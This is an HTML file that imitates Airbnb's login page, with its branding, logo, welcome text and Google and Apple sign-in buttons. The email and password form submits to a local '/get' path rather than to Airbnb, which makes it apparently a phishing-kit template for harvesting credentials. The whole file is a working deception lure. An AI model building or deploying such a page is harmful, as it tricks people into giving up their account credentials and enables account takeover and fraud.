<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <title>Airbnb</title>
    <style>
      body {
        font-family: -apple-system, BlinkMacSystemFont, 'Circular', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        background-color: #fff;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
      }
      .login-container {
        width: 400px;
        padding: 24px;
      }
      #logo {
        margin-bottom: 24px;
      }
      .g-h1 {
        font-size: 32px;
        font-weight: 800;
        color: #222;
        margin-bottom: 8px;
      }
      .g-h2 {
        font-size: 16px;
        color: #717171;
        margin-bottom: 24px;
      }
      .g-input {
        width: 100%;
        padding: 14px 16px;
        border: 1px solid #b0b0b0;
        border-radius: 8px;
        font-size: 17px;
        margin-bottom: 16px;
        box-sizing: border-box;
        outline: none;
      }
      .g-input:focus {
        border-color: #222;
        box-shadow: 0 0 0 2px #222;
      }
      .gbtn-primary {
        width: 100%;
        padding: 14px;
        background: linear-gradient(to right, #e61e49 0%, #e31c5f 50%, #d70466 100%);
        color: #fff;
        border: none;
        border-radius: 8px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
      }
      .gbtn-primary:hover {
        opacity: 0.9;
      }
      .or {
        display: flex;
        align-items: center;
        margin: 24px 0;
        color: #717171;
        font-size: 12px;
        font-weight: 600;
      }
      .or::before, .or::after {
        content: '';
        flex: 1;
        border-bottom: 1px solid #ddd;
      }
      .or span {
        padding: 0 16px;
      }
      .social-btn {
        width: 100%;
        padding: 14px;
        background: #fff;
        border: 1px solid #222;
        border-radius: 8px;
        font-size: 14px;
        font-weight: 600;
        color: #222;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        margin-bottom: 12px;
      }
      .social-btn:hover {
        background: #f7f7f7;
      }
      .footer {
        margin-top: 24px;
        font-size: 12px;
        color: #717171;
        text-align: center;
      }
      .footer a {
        color: #222;
        text-decoration: none;
        font-weight: 600;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <svg id="logo" viewBox="0 0 100 32" width="102" height="32">
        <path fill="#FF385C" d="M29 21.3c-0.1 0-0.1 0-0.2 0l-0.4-1.5c-0.2-0.7-0.5-1.3-0.8-1.9-0.3-0.5-0.6-1-0.9-1.4l-2.5 3.3 1 1.5h-6.2l-2-6.5-1.2 1.3c-0.4 0.5-0.7 1-1 1.5l-0.5 1.5h-4.4l5.6-15.1h1.4l3.5 9.9c0.4 1.1 0.7 2.1 1 3.1 0.3 0.9 0.5 1.8 0.7 2.7h0c0.2-0.9 0.4-1.8 0.7-2.7 0.3-1 0.6-2 1-3.1l3.5-9.9h1.4l5.6 15.1h-4.4l-0.5-1.5c-0.3-0.5-0.6-1-1-1.5l-1.2-1.3-2 6.5h-4l1-1.5-2.5-3.3c-0.3 0.4-0.6 0.9-0.9 1.4-0.3 0.6-0.6 1.2-0.8 1.9l-0.4 1.5c-0.1 0-0.1 0-0.2 0h-4.1l-5.6-15.1h1.6l5.4 14.6h6.5l5.4-14.6h1.6l-5.6 15.1h-4z"/>
        <text x="0" y="28" font-family="Arial" font-weight="800" font-size="20" fill="#FF385C">airbnb</text>
      </svg>
      <h1 class="g-h1">Welcome to Airbnb</h1>
      <p class="g-h2">Log in or sign up to continue</p>
      <form action="/get" method="POST">
        <input class="g-input" type="email" name="email" placeholder="Email" required>
        <input class="g-input" type="password" name="password" placeholder="Password" required>
        <button type="submit" class="gbtn-primary">Continue</button>
      </form>
      <div class="or"><span>or</span></div>
      <button class="social-btn">
        <svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
        Continue with Google
      </button>
      <button class="social-btn">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="#000"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
        Continue with Apple
      </button>
      <p class="footer">Don't have an account? <a href="#">Sign up</a></p>
    </div>
  </body>
</html>
